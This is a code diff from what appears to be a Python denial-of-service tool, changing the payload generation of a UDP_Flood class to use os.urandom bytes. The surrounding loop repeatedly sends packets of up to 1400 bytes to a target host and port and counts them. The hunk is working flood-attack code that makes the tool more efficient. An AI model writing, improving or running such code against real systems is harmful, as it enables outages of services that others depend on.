@@ -52,14 +52,16 @@ class UDP_Flood(DDoS_Class):
                     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                     if self.connection == True:
                         s.connect((self.target, self.port))
-                    msg = ""
-                    for x in range(random.randint(self.min_size, self.max_size)):
-                        msg += random.choice(Common_Variables.source_string)
+                    msg = os.urandom(random.randint(self.min_size, self.max_size))
+                    """for x in range(random.randint(self.min_size, self.max_size)):
+                        msg += random.choice(Common_Variables.source_string)"""
+                    if type(msg)==str:
+                         msg=msg.encode()
                     if len(msg) > 1400:
                         msg = msg[
                             0:1400
                         ]  # make sure all payloads' sizes are on the right range
-                    s.sendto((msg.encode("utf-8")), (self.target, self.port))
+                    s.sendto((msg), (self.target, self.port))
                     size += len(msg)
                     self.counter += 1
                     if (self.logs == True) and (int(time.time() - tm) == 1):
